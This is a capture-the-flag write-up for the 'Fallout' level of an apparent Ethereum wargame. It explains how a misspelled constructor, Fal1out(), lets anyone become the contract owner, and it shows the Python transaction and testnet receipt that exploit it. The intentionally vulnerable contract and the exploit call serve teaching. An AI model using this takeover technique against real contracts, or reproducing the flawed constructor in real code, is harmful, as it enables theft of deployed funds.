# 02 - Fallout

## Challenge

Claim ownership of the contract below to complete this level.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

## Summary

It is very obvious that the flaw comes from this part:

```js
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

Instead of `Fallout()`, which is the name of the contract, the constructor is named `Fal1out()`. This means that the "constructor" is not called when the contract is deployed, and the `owner` is not set. This means that anyone can call `Fal1out()` and become the owner of the contract.

## Walkthrough

Call `Fal1out()` to become the owner of the contract.

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import encode_with_signature
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x5791D4ccd39A311eEBE03d286A12e2BEcD2ee8d9'
>>> account.send_transaction(contract_addr, data=encode_with_signature("Fal1out()"), value=1)
2023-06-04 21:32:28.962 | INFO     | cheb3.account:send_transaction:103 - Transaction to 0x5791D4ccd39A311eEBE03d286A12e2BEcD2ee8d9: 0xa0db6df2128fb431da1f2269309b1592697e407c49b08d77d1a75fd2e30a97d8
AttributeDict({'blockHash': HexBytes('0x81191bde7b353f1a2a4236afbcf1cb581ee7b3936dc398fac73e90c4774b59ae'), 'blockNumber': 9124623, 'contractAddress': None, 'cumulativeGasUsed': 10408197, 'effectiveGasPrice': 38615, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 65506, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x5791D4ccd39A311eEBE03d286A12e2BEcD2ee8d9', 'transactionHash': HexBytes('0xa0db6df2128fb431da1f2269309b1592697e407c49b08d77d1a75fd2e30a97d8'), 'transactionIndex': 51, 'type': 0})
```

Submit the instance to pass the level.